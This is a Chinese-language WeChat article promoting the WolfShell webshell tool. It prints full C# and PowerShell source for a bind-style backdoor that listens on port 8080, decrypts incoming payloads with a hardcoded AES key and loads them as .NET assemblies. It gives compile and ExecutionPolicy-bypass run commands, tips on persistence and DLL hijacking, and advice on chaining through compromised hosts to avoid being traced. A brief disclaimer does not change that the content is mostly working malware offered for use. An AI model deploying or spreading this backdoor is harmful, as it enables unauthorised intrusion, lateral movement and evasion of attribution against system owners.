---
title: WolfShell 正向马 级联功能 横行内网
url: https://mp.weixin.qq.com/s/lI6O1j9igwWO7wrqA7FsIw
source: Doonsec's feed
date: 2026-05-07
fetch_date: 2026-05-08T04:50:55.046247
---

# WolfShell 正向马 级联功能 横行内网

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/p6tibQrAWXsqFHnXA7UVjic3fVcTia0knjhukGgSFHVVBeicGia0HOEnWoiclAGLMozv0SD2PuialNVj8B5lum5ibaml4P6YfyI6r7H3o2tDUWnibBaM/0?wx_fmt=jpeg)

# WolfShell 正向马 级联功能 横行内网

金刚狼
金刚狼

金刚狼不懂安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

### 金刚狼 正向马 c# & powershell 代码

之前有人说金刚狼集成了许多没用的渗透工具——像那类成堆的信息收集比如god、截屏功能，以及一些只对个人电脑有用的小工具。针对服务器上的 webshell，很多功能确实多余，甚至会运行报错。但别忘了，金刚狼也能用来控制个人终端：它并非只是为操控内网 webshell 而设计的级联功能，其最初目的就是在内网中横向扩展、横行各主机。若无法横行内网，那级联功能将无意义。

### exe版正向马

```
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Security.Cryptography;
using System.Reflection;

namespacewolfshell
{
    classProgram
    {
        static void Main(string[] args)
        {
            string url = "http://+:8080/wolfshell/";
            using (HttpListener listener = new HttpListener())
            {
                listener.Prefixes.Add(url);
                listener.Start();
                while (true)
                {
                    try
                    {
                        HttpListenerContext context = listener.GetContext();
                        byte[] k = Encoding.Default.GetBytes("ca63457538b9b1e0");
                        if (context.Request.Cookies.Count != 0)
                        {
                            MemoryStream ms = new MemoryStream();
                            context.Request.InputStream.CopyTo(ms);
                            byte[] c = ms.ToArray();
                            if (c.Length > 0)
                            {
                                RijndaelManaged rm = new RijndaelManaged();
                                byte[] d = rm.CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length);
                                Assembly.Load(d).CreateInstance("K").Equals(context);
                            }
                        }
                        context.Response.StatusCode = 200;
                        context.Response.Close();
                    }
                    catch { }
                }
            }
        }
    }
}
```

### 编译EXE

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:wolf.exe wolf.cs
```

### 执行exe

命令行或直接双击wolf.exe即可

PS：可自行修改，添加启动项，实现持久化，结合级联功能，内网横行。 也可以根据该代码修改成DLL，通过DLL劫持级联控制内网多台机器。

### PowerShell版 正向马

```
$l = New-Object System.Net.HttpListener
$l.Prefixes.Add("http://+:8080/wolfshell/")
$l.Start()

while ($l.IsListening) {
    $c = $l.GetContext()
    $q = $c.Request
    $s = $c.Response

    try {
        if ($q.Cookies.Count -ne 0) {
            $k = [System.Text.Encoding]::Default.GetBytes("ca63457538b9b1e0")
            $i = $q.InputStream
            $b = New-Object byte[] $q.ContentLength64
            $i.Read($b, 0, $b.Length)

            $r = New-Object System.Security.Cryptography.RijndaelManaged
            $d = $r.CreateDecryptor($k, $k)
            $f = $d.TransformFinalBlock($b, 0, $b.Length)

            $a = [System.Reflection.Assembly]::Load($f)
            $o = $a.CreateInstance("K")
            $o.Equals($c)
        }
        $s.StatusCode = 200
    } catch {
        $s.StatusCode = 500
    } finally {
        $s.Close()
    }
}
```

### 运行PowerShell正向马

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File wolf.ps1
```

### 连接正向马

添加shell:  http://192.168.50.69:8080/wolfshell

### IIS端口复用

若目标存在IIS，不管是PowerShell还是exe版，均支持端口复用

### 级联功能  目前支持cmd&powershell

#### 级联内网第3层WebShell 执行Cmd命令

通过入口点 192.168.50.106 级联内网 192.168.50.159 再次级联下一层内网 192.168.50.69 WebShell 执行命令

PS: 当然也可级联外网，比如抓了一些服务器当跳板，真正要搞的目标在第3层，这样就很难被追踪或溯源到你的真实IP了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/p6tibQrAWXsqjBqf7d4Vt6iasponHcvyCJoaK3klH57WQKuDFPe5rU7ya4V5OibUfkFAYmic5maN34IBFj3P8AMaf6KOzCp3D6TWDEzrnqu1ZbU/640?wx_fmt=png&from=appmsg)

#### 级联内网第2层WebShell 执行Cmd命令

通过入口点 192.168.50.159 级联内网 192.168.50.106 WebShell执行命令

![](https://mmbiz.qpic.cn/mmbiz_png/p6tibQrAWXsp2tibd8mNlIibk0X4l9fIVtcBhFxGZ1jh4jT7Wv616TuPmF4YqXnImGv4khz3SM5fUqb95g1vXpiayQglTTibLMibg4AlgYWkatdTE/640?wx_fmt=png&from=appmsg)

### 免责声明

```
使用WolfShell时，请遵循相关法律法规，确保在授权的环境中进行测试和使用。
本工具仅供教育和研究目的，任何滥用行为将由用户自行承担后果。
```

金刚狼下载：https://github.com/0x7556/wolfshell

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/Bua8mEDRSfdqtGg7TaoSf1iayXEx0tQKI7JLXicqPubWia0P4UWmd09JRfOiaicQb7iclpOD1gjCs2xjrEmow3Xib0VaQ/0?wx_fmt=png)

金刚狼不懂安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/Bua8mEDRSfdqtGg7TaoSf1iayXEx0tQKI7JLXicqPubWia0P4UWmd09JRfOiaicQb7iclpOD1gjCs2xjrEmow3Xib0VaQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过